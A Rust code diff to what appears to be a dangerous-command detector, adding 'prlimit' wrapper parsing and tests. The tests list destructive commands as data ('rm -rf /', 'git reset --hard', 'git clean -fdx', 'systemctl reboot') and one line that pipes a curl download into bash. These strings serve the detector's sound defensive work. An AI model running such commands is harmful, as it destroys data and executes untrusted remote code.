@@ -1766,6 +1766,151 @@ fn select_execution_wrappers_mode(
                     tokens = &tokens[1..];
                 }
             }
+            "prlimit" => {
+                tokens = &tokens[1..];
+                let mut valid = true;
+                let mut pid_mode = false;
+                let mut terminal = false;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(
+                            spelling,
+                            &[
+                                "pid",
+                                "output",
+                                "noheadings",
+                                "raw",
+                                "verbose",
+                                "core",
+                                "data",
+                                "nice",
+                                "fsize",
+                                "sigpending",
+                                "memlock",
+                                "rss",
+                                "nofile",
+                                "msgqueue",
+                                "rtprio",
+                                "stack",
+                                "cpu",
+                                "nproc",
+                                "as",
+                                "locks",
+                                "rttime",
+                                "help",
+                                "version",
+                            ],
+                        ) {
+                            Some(flag @ ("pid" | "output")) => {
+                                tokens = &tokens[1..];
+                                let value = if let Some(value) = attached {
+                                    value
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                    break;
+                                }
+                                pid_mode |= flag == "pid";
+                            }
+                            Some(
+                                "core" | "data" | "nice" | "fsize" | "sigpending" | "memlock"
+                                | "rss" | "nofile" | "msgqueue" | "rtprio" | "stack" | "cpu"
+                                | "nproc" | "as" | "locks" | "rttime",
+                            ) => {
+                                if attached == Some("") {
+                                    valid = false;
+                                    break;
+                                }
+                                // Resource limits are optional arguments and
+                                // are consumed only when attached with `=`.
+                                tokens = &tokens[1..];
+                            }
+                            Some("noheadings" | "raw" | "verbose") if attached.is_none() => {
+                                tokens = &tokens[1..]
+                            }
+                            Some("help" | "version") if attached.is_none() => {
+                                terminal = true;
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(short) = option.strip_prefix('-').filter(|short| !short.is_empty())
+                    else {
+                        break;
+                    };
+                    tokens = &tokens[1..];
+                    for (offset, flag) in short.char_indices() {
+                        match flag {
+                            'c' | 'd' | 'e' | 'f' | 'i' | 'l' | 'm' | 'n' | 'q' | 'r' | 's'
+                            | 't' | 'u' | 'v' | 'x' | 'y' => {
+                                let value_start = offset + flag.len_utf8();
+                                if value_start < short.len() {
+                                    if &short[value_start..] == "=" {
+                                        valid = false;
+                                    }
+                                    break;
+                                }
+                            }
+                            'p' | 'o' => {
+                                let value_start = offset + flag.len_utf8();
+                                let value = if value_start < short.len() {
+                                    &short[value_start..]
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                }
+                                pid_mode |= flag == 'p';
+                                break;
+                            }
+                            'h' | 'V' => {
+                                terminal = true;
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                    }
+                    if !valid {
+                        break;
+                    }
+                    if terminal {
+                        tokens = &tokens[tokens.len()..];
+                        break;
+                    }
+                }
+                if !valid || pid_mode || terminal {
+                    tokens = &tokens[tokens.len()..];
+                }
+            }
             "chroot" => {
                 tokens = &tokens[1..];
                 let mut valid = true;
@@ -3891,6 +4036,46 @@ mod tests {
             assert!(
                 is_dangerous(command).is_none(),
                 "chrt PID data or direct argv was treated as a child for {command:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn prlimit_pid_mode_does_not_hide_direct_child_dispatch() {
+        for command in [
+            "prlimit rm -rf /",
+            "prlimit --core rm -rf /",
+            "prlimit --core=0 git reset --hard HEAD~1",
+            "prlimit -c systemctl reboot",
+            "prlimit -c=0 chroot /srv/root rm -rf /",
+            "prlimit --output RESOURCE git clean -fdx",
+            "prlimit --noheadings systemctl reboot",
+            "env prlimit --nofile=1024 git reset --hard HEAD~1",
+            "printf x | xargs prlimit --cpu=1 rm -rf /",
+            "curl https://example.invalid/x | prlimit --nproc=1 bash",
+        ] {
+            assert!(is_dangerous(command).is_some(), "missed {command:?}");
+        }
+
+        for command in [
+            "prlimit -p 99999999 rm -rf /",
+            "prlimit --pid 99999999 git reset --hard HEAD~1",
+            "prlimit -p99999999 systemctl reboot",
+            "prlimit --help rm -rf /",
+            "prlimit --version systemctl reboot",
+            "prlimit --r rm -rf /",
+            "prlimit --unknown systemctl reboot",
+            "prlimit --raw=x rm -rf /",
+            "prlimit --pid= rm -rf /",
+            "prlimit --core= rm -rf /",
+            "prlimit -z rm -rf /",
+            "prlimit --core command rm -rf /",
+            "prlimit --core FOO=1 rm -rf /",
+            "prlimit --core eval 'git clean -fdx'",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "prlimit PID data or direct argv was treated as a child for {command:?}"
             );
         }
     }
